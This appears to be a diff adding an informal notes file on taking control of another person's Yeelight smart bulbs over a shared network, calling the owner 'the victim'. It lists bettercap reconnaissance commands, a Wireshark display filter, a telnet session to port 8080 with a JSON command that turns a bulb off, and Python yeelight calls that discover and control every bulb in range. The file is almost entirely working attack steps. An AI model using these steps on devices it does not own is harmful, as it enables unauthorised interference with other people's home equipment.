@@ -1,0 +1,32 @@
+NOTE:- Both methods can only work if you are on the same network as the victim
+
+
+Method 1:
+
+sudo bettercap
+net.recon on
+net.show  //check the networks for smart devices visible use note the IP addr down
+OPEN WIRESHARK
+start caputring traffic through any of ur wireless cards
+in "apply a display filter" --> ip.addr==192.168.1.1 (example ip of target device) and press ENTER
+from this you will be able to find out the ip addr of this device
+open new terminal 
+telnet 192.168.1.1 8080
+EXAMPLE COMMAND:- {"id":0,"method":set_power","params":["off", "smooth", 200]}
+
+
+Method 2:
+
+pip3 install yeelight 
+python3
+from yeelight import discover_bulbs
+NOW RUN WIRESHARK CAPTURE AGAIN
+back in terminal :- 
+discover_bulbs() //this will show ip addr and port numbers of all smart bulbs around you 
+then ---> from yeelight import Bulb 
+bulb = Bulb("192.168.1.1")
+bulb.*PRESS TAB TWICE TO SEE COMMANDS WHICH YOU CAN USE*
+EXAMPLE COMMANDS:- bulb.turn_off(), bulb.set_rgb(100,1,5)
+Once you have played around 
+quit() //closes python
+
